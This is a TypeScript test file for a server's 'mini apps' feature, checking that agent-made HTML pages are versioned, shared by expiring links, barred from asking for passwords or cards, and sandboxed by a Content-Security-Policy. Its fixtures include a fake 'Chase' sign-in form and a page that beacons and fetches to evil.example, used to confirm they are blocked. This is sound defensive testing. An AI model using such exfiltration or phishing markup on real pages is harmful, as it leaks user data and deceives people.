import assert from "node:assert/strict";
import { mkdtemp, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { test } from "node:test";
import { createApp } from "../apps/server/src/app.ts";
import type { Config } from "../apps/server/src/config.ts";
import { createStore } from "../apps/server/src/db.ts";
import { appDocument, MiniApps, miniAppToolSpecs } from "../apps/server/src/mini-apps.ts";

const PAGE =
  "<!DOCTYPE html><html><head><style>body{font:16px system-ui}</style></head><body><h1>Tip splitter</h1><script>document.body.append('ok')</script></body></html>";

test("a mini app is saved, updated as a new version, shared and stopped", async () => {
  const db = await createStore();
  let now = Date.parse("2026-09-27T12:00:00Z");
  const apps = new MiniApps(db, "https://muse.test/", () => now);
  const [make, list, share] = miniAppToolSpecs(apps, "owner") as unknown as {
    execute: (a: unknown) => Promise<Record<string, unknown>>;
  }[];
  const made = await make?.execute({ title: "Tip splitter", html: PAGE });
  assert.equal(made?.version, 1);
  assert.equal("html" in (made ?? {}), false, "the agent gets the summary, not the page back");
  const updated = await make?.execute({ id: made?.id, title: "Tip splitter", html: `${PAGE} ` });
  assert.equal(updated?.id, made?.id);
  assert.equal(updated?.version, 2);
  const listed = (await list?.execute({})) ?? {};
  assert.equal((listed.apps as unknown[]).length, 1);
  const link = (await share?.execute({ id: made?.id, days: 1 })) as { url: string };
  assert.match(link.url, /^https:\/\/muse\.test\/api\/mini\/[\w-]{32}$/);
  const token = link.url.split("/").at(-1) ?? "";
  assert.equal((await apps.open(token)).version, 2, "links show the latest version");
  // Nobody else sees or opens it.
  assert.deepEqual(await apps.list("someone-else"), []);
  await assert.rejects(apps.get("someone-else", String(made?.id)), /deleted/);
  now += 2 * 86_400_000;
  await assert.rejects(apps.open(token), /expired or was turned off/);
  now -= 2 * 86_400_000;
  await apps.remove("owner", String(made?.id));
  await assert.rejects(apps.open(token), /expired or was turned off/);
  await assert.rejects(apps.save("owner", { title: "Big", html: "x".repeat(200_001) }), /200 KB/);
  // A page that asks for a password or card could pass for a real sign-in.
  for (const html of [
    '<form><input name=u><input type="password" name=p></form>',
    "<input TYPE=Password>",
    '<input autocomplete="cc-number">',
  ])
    await assert.rejects(
      apps.save("owner", { title: "Sign in", html: `<h1>Chase</h1>${html}` }),
      /can’t ask for passwords/,
    );
});

test("a mini app page can't reach the network or the app, even if it tries", () => {
  const page = appDocument({
    title: "Budget <dashboard>",
    html: `<!doctype html><meta http-equiv="Content-Security-Policy" content="default-src *"><img src="https://evil.example/x?leak=1"><script>fetch("https://evil.example")</script>`,
  });
  // Our policy comes first, so a looser one in the page can only narrow it, never widen it.
  assert.ok(page.startsWith('<!doctype html><meta http-equiv="Content-Security-Policy"'));
  assert.match(page, /connect-src 'none'/);
  assert.match(page, /img-src data: blob:;/);
  assert.match(page, /<title>Budget &lt;dashboard&gt;<\/title>/);
  assert.equal(page.match(/<!doctype/gi)?.length, 1);
});

test("a shared mini app is served sandboxed, and the in-app copy needs a sign-in", async () => {
  const db = await createStore();
  const directory = await mkdtemp(join(tmpdir(), "openmuse-mini-"));
  const config: Config = {
    mode: "sample",
    port: 8787,
    host: "127.0.0.1",
    publicUrl: "http://localhost:8787",
    dataDir: directory,
    agentBackend: "sample",
    intelligenceApiKey: "test-project-key-never-sent",
    googleRedirectUri: "http://localhost:8787/api/google/callback",
    allowedOrigins: [],
  };
  const server = await createApp(db, config);
  try {
    const made = await server.agent.miniApps.save("local-user", { title: "Tips", html: PAGE });
    const { url } = await server.agent.miniApps.share("local-user", made.id, 7);
    const opened = await server.app.request(new URL(url).pathname);
    assert.equal(opened.status, 200);
    const policy = opened.headers.get("content-security-policy") ?? "";
    assert.match(policy, /^sandbox allow-scripts/);
    assert.doesNotMatch(policy, /allow-same-origin|escape-sandbox|allow-top-navigation/);
    assert.match(policy, /connect-src 'none'/);
    assert.match(opened.headers.get("x-robots-tag") ?? "", /noindex/);
    assert.match(await opened.text(), /Tip splitter/);
    assert.equal((await server.app.request(`/api/mini-apps/${made.id}`)).status, 401);
    const gone = await server.app.request("/api/mini/not-a-real-token-at-all-xx");
    assert.equal(gone.status, 404);
    assert.match(
      await gone.text(),
      /<h1>This link isn’t available<\/h1>.*Ask the person who sent it/s,
    );
  } finally {
    await server.agent.stop();
    await db.close();
    await rm(directory, { recursive: true, force: true });
  }
});
